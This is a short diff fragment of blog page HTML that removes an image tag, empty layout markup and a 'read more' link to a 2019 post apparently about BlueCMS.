-<p><img src="https://s2.ax1x.com/2019/06/10/V6Zw9K.jpg" alt="image"></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2019/06/09/bluecms/">展开全文 >></a>
         </p>
       
 
